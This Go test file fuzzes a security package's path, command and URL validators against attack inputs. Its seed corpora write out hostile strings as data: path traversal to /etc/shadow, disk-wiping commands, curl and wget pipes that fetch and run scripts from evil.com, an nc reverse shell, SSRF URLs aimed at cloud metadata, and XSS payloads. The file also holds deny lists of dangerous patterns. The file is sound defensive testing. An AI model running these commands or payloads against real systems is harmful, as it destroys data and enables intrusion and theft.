package security

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// FuzzPathValidation tests path validation against malicious inputs.
// Run with: go test -fuzz=FuzzPathValidation -fuzztime=30s ./internal/security/
func FuzzPathValidation(f *testing.F) {
	// Seed corpus with known attack vectors
	seedCorpus := []string{
		// Basic traversal
		"../../../etc/passwd",
		"..\\..\\..\\etc\\passwd",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",

		// Null byte injection
		"/tmp/safe.txt\x00/etc/passwd",
		"file.txt\x00.exe",

		// Unicode attacks
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%c1%9c..%c1%9c..%c1%9cetc/passwd",
		"..／..／..／etc/passwd", // fullwidth solidus

		// Path normalization bypass
		"/tmp/./test/../../../etc/passwd",
		"/tmp/test/....//....//etc/passwd",
		"/.../etc/passwd",
		"/..../etc/passwd",

		// Device files
		"/dev/null",
		"/dev/zero",
		"/dev/urandom",

		// Sensitive paths
		"/etc/shadow",
		"/etc/passwd",
		"/proc/self/environ",
		"/sys/kernel/debug",

		// Windows paths
		"C:\\Windows\\System32\\config\\SAM",
		"\\\\server\\share\\file",
		"file:///etc/passwd",

		// Edge cases
		"",
		"/",
		".",
		"..",
		"~",
		"~root",
		"~/../etc/passwd",

		// Long paths
		strings.Repeat("a", 1000),
		strings.Repeat("../", 100),
	}

	for _, seed := range seedCorpus {
		f.Add(seed)
	}

	// Create a validator with a safe temporary directory
	tmpDir := f.TempDir()
	validator, err := NewPath([]string{tmpDir})
	if err != nil {
		f.Fatalf("failed to create validator: %v", err)
	}

	f.Fuzz(func(t *testing.T, input string) {
		result, err := validator.Validate(input)

		// Property 1: Any validated path must exist within allowed directories
		if err == nil {
			// The result must be an absolute path
			if !filepath.IsAbs(result) {
				t.Errorf("validated path is not absolute: %q", result)
			}

			// The result must be within allowed directories
			if !strings.HasPrefix(result, tmpDir) && !strings.HasPrefix(result, validator.workDir) {
				t.Errorf("validated path escapes allowed directories: %q", result)
			}
		}

		// Property 2: Sensitive system paths must ALWAYS be rejected
		sensitivePaths := []string{"/etc", "/proc", "/sys", "/dev", "/root", "/var/log"}
		cleanInput := filepath.Clean(input)
		for _, sensitive := range sensitivePaths {
			if strings.HasPrefix(cleanInput, sensitive) || strings.Contains(cleanInput, sensitive+"/") {
				if err == nil {
					// Only fail if the result actually leads to a sensitive path
					if strings.HasPrefix(result, sensitive) {
						t.Errorf("sensitive path not blocked: input=%q result=%q", input, result)
					}
				}
			}
		}

		// Property 3: Null bytes should always cause rejection or be stripped
		if strings.Contains(input, "\x00") {
			if err == nil && strings.Contains(result, "\x00") {
				t.Errorf("null byte not stripped: input=%q result=%q", input, result)
			}
		}
	})
}

// FuzzIsPathSafe tests the quick path safety check.
func FuzzIsPathSafe(f *testing.F) {
	// Seed with known patterns
	seeds := []string{
		"../../../etc/passwd",
		"/etc/passwd",
		"/dev/null",
		"/proc/self/environ",
		"/sys/kernel",
		"c:\\windows\\system32",
		"/tmp/safe/file.txt",
		"relative/path.txt",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		result := IsPathSafe(input)

		// Property: Known dangerous patterns must always return false
		lowerInput := strings.ToLower(input)
		dangerousPatterns := []string{"../", "..\\", "/etc/", "/dev/", "/proc/", "/sys/"}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(lowerInput, pattern) {
				if result {
					t.Errorf("dangerous pattern not detected: input=%q pattern=%q", input, pattern)
				}
			}
		}
	})
}

// FuzzPathValidationWithSymlinks tests symlink handling.
func FuzzPathValidationWithSymlinks(f *testing.F) {
	f.Add("link_to_etc")
	f.Add("nested/deep/symlink")
	f.Add("circular_link")

	f.Fuzz(func(t *testing.T, linkName string) {
		// Skip invalid link names
		if linkName == "" || strings.Contains(linkName, "/") || strings.Contains(linkName, "\\") {
			return
		}
		if strings.Contains(linkName, "\x00") {
			return
		}

		tmpDir := t.TempDir()
		validator, err := NewPath([]string{tmpDir})
		if err != nil {
			t.Skipf("failed to create validator: %v", err)
		}

		// Create a symlink pointing outside allowed directories
		linkPath := filepath.Join(tmpDir, linkName)
		err = os.Symlink("/etc/passwd", linkPath)
		if err != nil {
			t.Skipf("failed to create symlink: %v", err)
		}

		// Validation should fail because symlink points outside allowed dirs
		_, err = validator.Validate(linkPath)
		if err == nil {
			t.Errorf("symlink to /etc/passwd was not blocked: link=%q", linkPath)
		}
	})
}

// =============================================================================
// Command Fuzzing Tests
// =============================================================================

// FuzzCommandValidation tests command validation against injection attempts.
// Run with: go test -fuzz=FuzzCommandValidation -fuzztime=30s ./internal/security/
func FuzzCommandValidation(f *testing.F) {
	// Seed corpus with known attack vectors
	cmdSeeds := []struct {
		cmd  string
		args string
	}{
		// Basic commands
		{"ls", "-la"},
		{"cat", "/etc/passwd"},
		{"echo", "hello world"},

		// Shell injection in command name
		{"; rm -rf /", ""},
		{"ls; rm -rf /", ""},
		{"ls | cat /etc/passwd", ""},
		{"$(whoami)", ""},
		{"`whoami`", ""},
		{"ls && rm -rf /", ""},

		// Dangerous commands
		{"rm", "-rf /"},
		{"rm", "-rf /*"},
		{"dd", "if=/dev/zero of=/dev/sda"},
		{"mkfs", "/dev/sda"},
		{"shutdown", "-h now"},
		{"reboot", ""},

		// Not in whitelist
		{"python", "-c 'import os; os.system(\"rm -rf /\")'"},
		{"curl", "http://evil.com/malware.sh | bash"},
		{"wget", "-O- http://evil.com/malware.sh | sh"},
		{"nc", "-e /bin/sh evil.com 4444"},

		// Null byte injection
		{"ls\x00rm", "-rf /"},
		{"cat", "file.txt\x00/etc/passwd"},

		// Long arguments
		{"echo", strings.Repeat("A", 20000)},

		// Unicode tricks
		{"ls", "—help"}, // em dash instead of hyphen
		{"ｌｓ", "-la"},   // fullwidth characters
	}

	for _, seed := range cmdSeeds {
		f.Add(seed.cmd, seed.args)
	}

	validator := NewCommand()

	f.Fuzz(func(t *testing.T, cmd, args string) {
		argSlice := strings.Fields(args)
		err := validator.ValidateCommand(cmd, argSlice)

		// Property 1: Commands with shell metacharacters in name must be rejected
		shellMetachars := []string{";", "|", "&", "`", "$", "(", ")", "\n", ">", "<"}
		for _, char := range shellMetachars {
			if strings.Contains(cmd, char) {
				if err == nil {
					t.Errorf("shell metachar in cmd not blocked: cmd=%q char=%q", cmd, char)
				}
				return // One check is enough
			}
		}

		// Property 2: Commands not in whitelist must be rejected
		whitelist := map[string]bool{
			"ls": true, "cat": true, "head": true, "tail": true, "less": true, "more": true,
			"grep": true, "find": true, "wc": true, "sort": true, "uniq": true,
			"pwd": true, "cd": true, "mkdir": true, "tree": true,
			"date": true, "whoami": true, "hostname": true, "uname": true,
			"df": true, "du": true, "free": true, "top": true, "ps": true,
			"ping": true, "traceroute": true, "nslookup": true, "dig": true,
			"git": true,
			"go":  true, "npm": true, "yarn": true, "make": true,
			"echo": true, "printf": true, "which": true, "whereis": true,
		}

		cmdLower := strings.ToLower(strings.TrimSpace(cmd))
		if cmdLower != "" && !whitelist[cmdLower] {
			if err == nil {
				t.Errorf("non-whitelisted command not blocked: cmd=%q", cmd)
			}
		}

		// Property 3: Dangerous argument patterns must be rejected
		fullArgs := strings.ToLower(strings.Join(argSlice, " "))
		dangerousPatterns := []string{"rm -rf /", "rm -rf /*", "rm -rf ~", "mkfs", "shutdown", "reboot"}
		for _, pattern := range dangerousPatterns {
			if strings.Contains(fullArgs, pattern) {
				if err == nil {
					t.Errorf("dangerous pattern in args not blocked: args=%q pattern=%q", args, pattern)
				}
			}
		}

		// Property 4: Null bytes must be rejected
		if strings.Contains(cmd, "\x00") || strings.Contains(args, "\x00") {
			if err == nil {
				t.Errorf("null byte not blocked: cmd=%q args=%q", cmd, args)
			}
		}

		// Property 5: Excessively long arguments must be rejected
		for _, arg := range argSlice {
			if len(arg) > 10000 {
				if err == nil {
					t.Errorf("excessively long argument not blocked: len=%d", len(arg))
				}
			}
		}
	})
}

// FuzzIsCommandSafe tests the quick command safety check.
func FuzzIsCommandSafe(f *testing.F) {
	seeds := []string{
		"ls -la",
		"rm -rf /",
		"cat /etc/passwd",
		"echo hello",
		"sudo rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		"shutdown -h now",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, cmd string) {
		result := IsCommandSafe(cmd)

		// Property: Known dangerous patterns must always return false
		lowerCmd := strings.ToLower(cmd)
		dangerousPatterns := []string{"rm -rf", "mkfs", "dd if=", "sudo", "shutdown", "reboot"}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(lowerCmd, pattern) {
				if result {
					t.Errorf("dangerous pattern not detected: cmd=%q pattern=%q", cmd, pattern)
				}
			}
		}
	})
}

// =============================================================================
// HTTP/SSRF Fuzzing Tests
// =============================================================================

// FuzzHTTPValidateURL tests URL validation against SSRF attempts.
// Run with: go test -fuzz=FuzzHTTPValidateURL -fuzztime=30s ./internal/security/
func FuzzHTTPValidateURL(f *testing.F) {
	// Seed corpus with known SSRF attack vectors
	seeds := []string{
		// Basic SSRF targets
		"http://localhost/admin",
		"http://127.0.0.1/",
		"http://0.0.0.0/",
		"http://[::1]/",

		// Cloud metadata endpoints
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://169.254.169.254/metadata/v1/",

		// Private IP ranges
		"http://10.0.0.1/",
		"http://172.16.0.1/",
		"http://192.168.1.1/",

		// DNS rebinding attempts
		"http://localtest.me/",
		"http://127.0.0.1.nip.io/",
		"http://spoofed.burpcollaborator.net/",

		// Protocol smuggling
		"file:///etc/passwd",
		"gopher://localhost:25/",
		"dict://localhost:11211/",
		"ftp://localhost/",

		// URL encoding bypass
		"http://127.0.0.1%2f@evil.com/",
		"http://localhost%00.evil.com/",
		"http://127。0。0。1/", // fullwidth dots

		// IPv6 variations
		"http://[0:0:0:0:0:0:0:1]/",
		"http://[::ffff:127.0.0.1]/",

		// Decimal/Octal/Hex IP
		"http://2130706433/",   // 127.0.0.1 in decimal
		"http://0x7f000001/",   // 127.0.0.1 in hex
		"http://017700000001/", // 127.0.0.1 in octal

		// Short forms
		"http://127.1/",
		"http://0/",

		// Valid external URLs (should pass)
		"https://example.com/",
		"https://api.github.com/",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	validator := NewHTTP()

	f.Fuzz(func(t *testing.T, urlStr string) {
		err := validator.ValidateURL(urlStr)

		// Property 1: localhost/loopback must ALWAYS be rejected
		lowerURL := strings.ToLower(urlStr)
		loopbackPatterns := []string{
			"localhost", "127.0.0.1", "0.0.0.0", "[::1]",
			"[0:0:0:0:0:0:0:1]",
		}
		for _, pattern := range loopbackPatterns {
			if strings.Contains(lowerURL, pattern) {
				if err == nil {
					t.Errorf("loopback not blocked: url=%q pattern=%q", urlStr, pattern)
				}
				return
			}
		}

		// Property 2: Cloud metadata endpoints must be rejected
		metadataPatterns := []string{"169.254.169.254", "metadata.google.internal"}
		for _, pattern := range metadataPatterns {
			if strings.Contains(lowerURL, pattern) {
				if err == nil {
					t.Errorf("metadata endpoint not blocked: url=%q pattern=%q", urlStr, pattern)
				}
				return
			}
		}

		// Property 3: Non-HTTP(S) schemes must be rejected
		dangerousSchemes := []string{"file://", "gopher://", "ftp://", "dict://"}
		for _, scheme := range dangerousSchemes {
			if strings.HasPrefix(lowerURL, scheme) {
				if err == nil {
					t.Errorf("dangerous scheme not blocked: url=%q scheme=%q", urlStr, scheme)
				}
				return
			}
		}

		// Property 4: Private IP ranges must be rejected
		privatePatterns := []string{"10.0.0.", "172.16.", "172.17.", "192.168."}
		for _, pattern := range privatePatterns {
			if strings.Contains(lowerURL, pattern) {
				if err == nil {
					t.Errorf("private IP not blocked: url=%q pattern=%q", urlStr, pattern)
				}
				return
			}
		}
	})
}

// FuzzIsURLSafe tests the quick URL safety check.
func FuzzIsURLSafe(f *testing.F) {
	seeds := []string{
		"https://example.com/",
		"http://localhost/",
		"file:///etc/passwd",
		"http://169.254.169.254/",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, urlStr string) {
		result := IsURLSafe(urlStr)

		// Property: Known dangerous patterns must return false
		lowerURL := strings.ToLower(urlStr)
		dangerousPatterns := []string{
			"file://", "javascript:", "data:", "localhost",
			"127.0.0.1", "169.254.169.254", "metadata",
		}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(lowerURL, pattern) || strings.HasPrefix(lowerURL, pattern) {
				if result {
					t.Errorf("dangerous pattern not detected: url=%q pattern=%q", urlStr, pattern)
				}
			}
		}
	})
}
